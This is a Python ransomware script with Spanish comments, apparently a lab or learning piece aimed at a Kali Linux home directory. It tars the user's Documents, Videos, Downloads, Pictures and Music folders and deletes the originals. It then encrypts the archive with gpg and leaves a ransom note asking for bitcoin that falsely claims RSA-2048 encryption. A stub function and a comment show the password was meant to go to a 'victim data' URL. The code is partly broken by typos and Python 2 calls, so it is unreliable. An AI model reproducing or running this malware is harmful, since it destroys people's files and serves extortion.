#!/usr/bin/python3

import os
import sys
import subprocess
import random
import string
import requests
import re

def linux():
    if(os.geteuid () == 0):
        directories.append("/home/kali/")
        
    #Genera el password de cifrado
    S = string.ascii_lowercase + string.digits
    pwd =  str(''.join(random.sample(S, 30)))
    
    #Genera un ID unico
    t = string.ascii_lowercase
    idd = str(''.join(random. sample(t, 10)))
    
    #se ejecutoan las funciones para cifrar los datos
    sendCred(url, pwd, idd)
    crypt(directories, pwd)
    howto(directories, bitcoin, price)
    decryptGen(str(directories))

def sendCred(url, pwd, idd):
    values = {'pass' : pwd,'id'   :idd}
    text = ""
    text += pwd + "\n" + idd
    print(text)
        
def crypt(directory, pwd):
    if(type(directory) != list):
            sys.exit('El fornato recibido es incorrecto!')
            
    for dirr in directory:
        os.chdir(dirr)
        os.system('tar cvf encrypted.tar *')
        os.system('find . ! -name encrypted.tar -type f -delete')
        os.system('find . ! -name encrypted.tar -type d -delete')
        os.system('echo' + pwd + '| gpg --batch --passphrase-fd 0 -c encrypted.tar')
        os.system('rm encrypted.tar')
        os.chdir('../')
        """print ".............. """
        
def howto(directory, bitcoin, price):
    txt = "\n"
    txt += "Hola te estaras preguntando Que paso con tus archivos?\n"
    txt += "todos ellos fueron cifrados con RSA-2048\n"
    txt += "si los quieres recuperar ne debes pagar : """ + str(price) + "\n"
    txt += "Mi direccton de bitcoins es: "+ bitcoin + "\n"
    txt += "Cuando recibas el password usa el archivo decrypt.py\n\n"
    archivo = open("recuperar-mis-archivos.txt", "w")
    archivo.write(txt)
    archivo.close()
    for dirr in directory:
        os.system("cp 'recuperar-mis-archivos.txt' " + dirr)
        
def decryptGen(directory):
    txt = ""
    txt += "#!/usr/bin/python3\n"
    txt += "import os\n"
    txt += "import sys\n"
    txt += "directory = ls\n"
    txt += "pwd = raw_input('Ingrese el password para descifrar los archivos: ')\n"
    txt += "for dirr in directory: \n"
    txt += "    os.chdir(dtrr)\n"
    txt += "    if(os.system('gpg --passphrase ' + pwd + ' -d encrypted.tar.gpg > unencrypted. tar') != 0):\n"
    txt += "        sys.exit('Password Incorrecto!')\n"
    txt += "    os.systen('tar xvf unencrypted.tar')\n"
    txt += "    os.system('rm unencrypted.tar')\n"
    txt += "    os.system('rm unencrypted.tar.gpg')\n"
    txt += "    os.system('rm unencrypted.tar')\n"
    txt += "    os.system('rm recuperar-mis-archivos.txt')\n"
    txt += "    os.chdir('../')\n"
    archivo = open("decrypt.py", "w")
    archivo.write(txt)
    archivo.close()
    
#directortos a cifrar
directories = ['/home/kali/Documents', '/home/kali/Videos' , '/home/kali/Downloads' , '/home/kali/Pictures' ,'/home/kali/Music']
bitcoin= 'aAhRS4CVf45FFf3q2kL'
price = 1
url= 'http://localhost/datosvictina.php' #ingresa lo url a donde se va enviar el td y password
linux()
